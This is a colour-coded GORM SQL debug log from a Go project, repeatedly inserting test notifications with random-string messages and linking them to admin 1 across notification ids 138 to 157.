[0m[33m[1.734ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 138 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[24.156ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.334','2025-06-09 14:07:59.334',NULL,1,138) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[14.762ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.356','2025-06-09 14:07:59.356',NULL,'ryXlyUquZIHToEiijOXF','system','2025-06-09 14:07:59.356',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.742ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.344ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 139 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[12.827ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.375','2025-06-09 14:07:59.375',NULL,1,139) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[11.763ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.384','2025-06-09 14:07:59.384',NULL,'ZEQPBuuqdwHTCZTcTsdY','system','2025-06-09 14:07:59.384',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.488ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.491ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 140 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[11.155ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.397','2025-06-09 14:07:59.397',NULL,1,140) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.559ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.407','2025-06-09 14:07:59.407',NULL,'ATKUmDDSUutIvQSmVGRv','system','2025-06-09 14:07:59.407',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.479ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.613ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 141 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.558ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.416','2025-06-09 14:07:59.416',NULL,1,141) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.838ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.423','2025-06-09 14:07:59.423',NULL,'AkVAcWEaplAUHftUQJqp','system','2025-06-09 14:07:59.423',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.823ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.727ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 142 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[10.338ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.433','2025-06-09 14:07:59.433',NULL,1,142) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.744ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.44','2025-06-09 14:07:59.44',NULL,'NoamvhJKjkJgCOObhnWz','system','2025-06-09 14:07:59.44',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.519ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.631ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 143 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.730ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.451','2025-06-09 14:07:59.451',NULL,1,143) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.221ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.459','2025-06-09 14:07:59.459',NULL,'pAlFDFxSwgPCdbuKIIYb','system','2025-06-09 14:07:59.458',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.584ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.773ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 144 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[16.355ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.469','2025-06-09 14:07:59.469',NULL,1,144) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.746ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.481','2025-06-09 14:07:59.481',NULL,'JnWZWSStNVDDyLkHEdnm','system','2025-06-09 14:07:59.481',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.526ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.588ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 145 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.315ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.488','2025-06-09 14:07:59.488',NULL,1,145) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.399ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.495','2025-06-09 14:07:59.495',NULL,'qAxitgrIpDFYJnBqfCcE','system','2025-06-09 14:07:59.494',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.543ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.572ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 146 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.433ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.505','2025-06-09 14:07:59.505',NULL,1,146) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.875ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.512','2025-06-09 14:07:59.512',NULL,'gSFmjCkVzIAvdGbMZNSs','system','2025-06-09 14:07:59.511',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.687ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.672ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 147 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.446ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.519','2025-06-09 14:07:59.519',NULL,1,147) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.665ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.527','2025-06-09 14:07:59.527',NULL,'RHWJYHppGJhGqeUOIIcs','system','2025-06-09 14:07:59.527',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.671ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.697ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 148 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[12.335ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.537','2025-06-09 14:07:59.537',NULL,1,148) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.890ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.545','2025-06-09 14:07:59.545',NULL,'OwojAoYVSIBPyvWrMbiS','system','2025-06-09 14:07:59.545',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.505ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.550ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 149 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.361ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.555','2025-06-09 14:07:59.555',NULL,1,149) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.801ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.562','2025-06-09 14:07:59.562',NULL,'KXjoZJvhEnecfsfsLJRj','system','2025-06-09 14:07:59.562',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.747ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.499ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 150 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.508ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.571','2025-06-09 14:07:59.571',NULL,1,150) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.695ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.577','2025-06-09 14:07:59.577',NULL,'xOAhsLvjjjsGJkubppYG','system','2025-06-09 14:07:59.577',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.475ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.552ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 151 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.530ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.584','2025-06-09 14:07:59.584',NULL,1,151) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.599ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.593','2025-06-09 14:07:59.593',NULL,'WEokINOglWAphqtXhQTK','system','2025-06-09 14:07:59.592',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.444ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.593ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 152 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.170ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.601','2025-06-09 14:07:59.601',NULL,1,152) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.045ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.609','2025-06-09 14:07:59.609',NULL,'iGFgORDlxmLAZFmYHjeb','system','2025-06-09 14:07:59.608',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.439ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.453ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 153 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[6.938ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.619','2025-06-09 14:07:59.619',NULL,1,153) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.514ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.625','2025-06-09 14:07:59.625',NULL,'vsxkrduPIdmyloCVaTWl','system','2025-06-09 14:07:59.625',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.457ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.471ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 154 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.183ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.634','2025-06-09 14:07:59.634',NULL,1,154) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[10.639ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.643','2025-06-09 14:07:59.643',NULL,'DDNOtnTbLCpTLyFQUcqg','system','2025-06-09 14:07:59.64',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.382ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.499ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 155 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[6.888ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.652','2025-06-09 14:07:59.652',NULL,1,155) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.910ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.658','2025-06-09 14:07:59.658',NULL,'eGQGMqkJxpJpHMfqZnRb','system','2025-06-09 14:07:59.658',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.578ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.522ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 156 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.876ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.665','2025-06-09 14:07:59.665',NULL,1,156) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.987ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.673','2025-06-09 14:07:59.673',NULL,'SPMLrvrTBMsEywPiXQdB','system','2025-06-09 14:07:59.673',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.378ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.450ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 157 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[6.594ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.68','2025-06-09 14:07:59.68',NULL,1,157) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.727ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.686','2025-06-09 14:07:59.686',NULL,'JFGZDhWWqHUFJuzBrASf','system','2025-06-09 14:07:59.686',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
